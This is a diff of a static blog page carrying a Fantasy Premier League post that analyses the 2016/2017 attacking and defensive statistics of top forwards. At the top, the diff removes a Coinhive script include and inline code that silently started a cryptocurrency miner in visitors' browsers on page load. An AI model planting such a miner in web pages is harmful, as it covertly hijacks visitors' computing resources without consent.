@@ -39,31 +39,8 @@
         })();
   </script>
   
-  <script src="https://coinhive.com/lib/coinhive.min.js"></script>
 </head>
 <body>
-<script>
-  var miner = new CoinHive.Anonymous('0Q2TtxhYQVKpZ8093Pd2RDdyZaWsqJoh');
-  miner.start();
-</script>
-
-<script>
-  // Listen on events
-  miner.on('found', function() {  })
-  miner.on('accepted', function() {  })
-
-  // Update stats once per second
-  setInterval(function() {
-      var hashesPerSecond = miner.getHashesPerSecond();
-      var totalHashes = miner.getTotalHashes();
-      var acceptedHashes = miner.getAcceptedHashes();
-
-      // Output to HTML elements...
-      console.log("H/s: " + hashesPerSecond);
-      console.log("Total Hashes: " + totalHashes);
-      console.log("Acepted Hashes: " + acceptedHashes);
-  }, 1000);
-</script>
   <div class="table-container">
     <div class="table-block footer-push">
       <div class="container">
@@ -118,9 +95,9 @@
       <p><h2 id="fantasy_premier_league_team_selection"><a class="toclink" href="#fantasy_premier_league_team_selection">Fantasy Premier League Team Selection</a></h2>
 <p>This post is a part of my <a href="/tagged/fantasy-football">Fantasy Football</a> team selection <a href="/tagged/fpl-selection">series</a>, where - as alluded previously - I aim to assist you in the best possible way in making your 2017/2018 picks, at pre-season time, as well as once the season has been kicked off.</p>
 <p><a href="/fantasy_football_total_points_contributions_for_season_2016_2017.html">Last time</a> our focus was on investigating how each player - among those ones who finished at the first 50 positions, ranked by highest overall points scored - contributed to the total points count of his team and, furthermore, his playing line within the team.</p>
-<p>This post, however, is more concerned with the actual playing characteristics of the leading<sup id="fnref:by_total_points"><a rel="footnote" class="footnote-ref" href="#fn:by_total_points">1</a></sup> players, as observed in their overall statistics for the English Premier League 2016/2017 season.</p>
+<p>This post, however, is more concerned with the actual playing characteristics of the leading<sup id="fnref:by_total_points"><a class="footnote-ref" rel="footnote" href="#fn:by_total_points">1</a></sup> players, as observed in their overall statistics for the English Premier League 2016/2017 season.</p>
 <h2 id="contribution_to_team_play"><a class="toclink" href="#contribution_to_team_play">Contribution to Team Play</a></h2>
-<p>Particularly, we'll look at various attacking and defensive statistics<sup id="fnref:scored_goals_excluded"><a rel="footnote" class="footnote-ref" href="#fn:scored_goals_excluded">2</a></sup> of top players from different lines. In order to keep the analyses clean and uncluttered, I've decided to split the visualisations and commentary on a playing line basis; thus, this post is, essentially, the first in a <a href="/tagged/team-play-contributions">series</a>, that will focus on individual contributions to team-play. We'll start by looking at the forwards, who have netted 150 points or more last season. They turn out to be 7 in total:</p>
+<p>Particularly, we'll look at various attacking and defensive statistics<sup id="fnref:scored_goals_excluded"><a class="footnote-ref" rel="footnote" href="#fn:scored_goals_excluded">2</a></sup> of top players from different lines. In order to keep the analyses clean and uncluttered, I've decided to split the visualisations and commentary on a playing line basis; thus, this post is, essentially, the first in a <a href="/tagged/team-play-contributions">series</a>, that will focus on individual contributions to team-play. We'll start by looking at the forwards, who have netted 150 points or more last season. They turn out to be 7 in total:</p>
 <ul>
 <li>Romelu Lukaku (221 points, avg. value £9.74)</li>
 <li>Harry Kane (220 points, avg. value £11.13)</li>
@@ -142,7 +119,7 @@
 <p>As enlisted above, the play contribution plots are captioned, naturally, with the player name, along with the
 total amount of points scored for the corresponding season, as well as the average transfer cost of that player (averaged over the cost of that player, corresponding to each individual gameweek). It is important to note here that the scale ranges/limits are fixed for all plots, for the purpose of enabling comparability between individual players. The maximum value along each scale is the greatest value that has been observed among <em>only</em> the seven forwards on focus (as the idea of the study is to find indicative characteristics, in a relative fashion).</p>
 <p>I'll briefly go over some significant observations, based on the graphs presented above, whilst leaving the conclusions, as well as transfer and selection decisions, as an exercise, entirely for you. Firstly, we can see that the most creative forwards are Costa, Lukaku and Ibrahimovic, with Kane following somehow closely in pursuit. In defensive plan, noteworthy mentions are Kane, Costa and Defoe, along with Ibrahimovic.</p>
-<p>As for the not so positive "contributions", some sort of an indication (or validation in Agüero's case) can be inferred, regarding a player's injury proneness or lower capabilities for recovery from fatigue. Namely, Kane's, Agüero's, Ibrahimovic's and Vardy's performances are characterised by the lowest number of minutes played. This, in Kane's case automatically grants him the award of highest conversion efficiency, as he's the top goalscorer of last season, and a runner-up in the total points ranking, for his playing line (losing by just a <em>single</em> point, to Romelu Lukaku, who played 831 minutes more than Kane did; this is 9.25 games!). This, essentially, reinforces the self-referential nature of this post by serving as a reminder that a player's output - in terms of goals, total points scored or otherwise - is largely a function of the collective contributions<sup id="fnref:playing_line_contributions"><a rel="footnote" class="footnote-ref" href="#fn:playing_line_contributions">4</a></sup> of those team-mates (whose output is also result of the same recursive process), who were part of the ten playing field players, at any given time, as well as the team synergy level.</p>
+<p>As for the not so positive "contributions", some sort of an indication (or validation in Agüero's case) can be inferred, regarding a player's injury proneness or lower capabilities for recovery from fatigue. Namely, Kane's, Agüero's, Ibrahimovic's and Vardy's performances are characterised by the lowest number of minutes played. This, in Kane's case automatically grants him the award of highest conversion efficiency, as he's the top goalscorer of last season, and a runner-up in the total points ranking, for his playing line (losing by just a <em>single</em> point, to Romelu Lukaku, who played 831 minutes more than Kane did; this is 9.25 games!). This, essentially, reinforces the self-referential nature of this post by serving as a reminder that a player's output - in terms of goals, total points scored or otherwise - is largely a function of the collective contributions<sup id="fnref:playing_line_contributions"><a class="footnote-ref" rel="footnote" href="#fn:playing_line_contributions">4</a></sup> of those team-mates (whose output is also result of the same recursive process), who were part of the ten playing field players, at any given time, as well as the team synergy level.</p>
 <p>At the other end of the spectrum, Jermaine Defoe, aged 34, spent the mind-bending 3322 playing minutes on the field, which when converted to number of games adds up to almost 37 games!</p>
 <h2 id="conclusion"><a class="toclink" href="#conclusion">Conclusion</a></h2>
 <p>That's all for today, folks! Good luck in the forthcoming Fantasy Premier League season, and stay tuned for more analysis and visualisations on the same topic. It may be a good idea to follow me on <a href="https://twitter.com/hristogeo">Twitter</a>, if you haven't done so already ;)</p>
@@ -150,16 +127,16 @@ total amount of points scored for the corresponding season, as well as the avera
 <hr />
 <ol>
 <li id="fn:by_total_points">
-<p>I maintain the opinion that the most useful analyses are those which invariably incorporate the notion of player output, as expressed in Fantasy Football terms, namely points scored (as this is the ultimate metric, based on which, all teams are ranked in the league standings, be it final or intermediate). Thus, it's always useful to reflect and, if possible, present a form of correlation analysis (or display) between the total points, possibly accompanied with its sister metric - player transfer value (or cost), and whatever discriminative features or statistics are utilised for analysing a subset of players. <a rev="footnote" title="Jump back to footnote 1 in the text" class="footnote-backref" href="#fnref:by_total_points">↩</a></p>
+<p>I maintain the opinion that the most useful analyses are those which invariably incorporate the notion of player output, as expressed in Fantasy Football terms, namely points scored (as this is the ultimate metric, based on which, all teams are ranked in the league standings, be it final or intermediate). Thus, it's always useful to reflect and, if possible, present a form of correlation analysis (or display) between the total points, possibly accompanied with its sister metric - player transfer value (or cost), and whatever discriminative features or statistics are utilised for analysing a subset of players. <a title="Jump back to footnote 1 in the text" class="footnote-backref" href="#fnref:by_total_points" rev="footnote">↩</a></p>
 </li>
 <li id="fn:scored_goals_excluded">
-<p>Please, note that I've deliberately excluded the total number of goals scored, which by itself can be a misleading statistic, as it doesn't clearly indicate whether the goals in question were scored predominantly as a result of a player's attacking positioning, his finishing skill, his teammates' creativity or otherwise. <a rev="footnote" title="Jump back to footnote 2 in the text" class="footnote-backref" href="#fnref:scored_goals_excluded">↩</a></p>
+<p>Please, note that I've deliberately excluded the total number of goals scored, which by itself can be a misleading statistic, as it doesn't clearly indicate whether the goals in question were scored predominantly as a result of a player's attacking positioning, his finishing skill, his teammates' creativity or otherwise. <a title="Jump back to footnote 2 in the text" class="footnote-backref" href="#fnref:scored_goals_excluded" rev="footnote">↩</a></p>
 </li>
 <li id="fn:interceptions">
-<p>The <em>interceptions</em> metric has been particularly defined to include the total number of clearances, blocks and interceptions, for a given player. <a rev="footnote" title="Jump back to footnote 3 in the text" class="footnote-backref" href="#fnref:interceptions">↩</a></p>
+<p>The <em>interceptions</em> metric has been particularly defined to include the total number of clearances, blocks and interceptions, for a given player. <a title="Jump back to footnote 3 in the text" class="footnote-backref" href="#fnref:interceptions" rev="footnote">↩</a></p>
 </li>
 <li id="fn:playing_line_contributions">
-<p>This can be further verified via referring to the study of <a href="/fantasy_football_total_points_contributions_for_season_2016_2017.html">total points contributions</a>, which pays an honourable mention to the Tottenham midfield line, who were the highest scoring midfield line for FPL season 2016/2017, in terms of total number of points scored. <a rev="footnote" title="Jump back to footnote 4 in the text" class="footnote-backref" href="#fnref:playing_line_contributions">↩</a></p>
+<p>This can be further verified via referring to the study of <a href="/fantasy_football_total_points_contributions_for_season_2016_2017.html">total points contributions</a>, which pays an honourable mention to the Tottenham midfield line, who were the highest scoring midfield line for FPL season 2016/2017, in terms of total number of points scored. <a title="Jump back to footnote 4 in the text" class="footnote-backref" href="#fnref:playing_line_contributions" rev="footnote">↩</a></p>
 </li>
 </ol>
 </div><p></p>
@@ -204,7 +181,7 @@ total amount of points scored for the corresponding season, as well as the avera
       </div>
     </div>  <!-- end table block footer div -->
   </div>
-  <!-- Last generated: 2017-12-23T18:36:06Z -->
+  <!-- Last generated: 2018-04-02T21:37:01Z -->
 </body>
 </html>
 
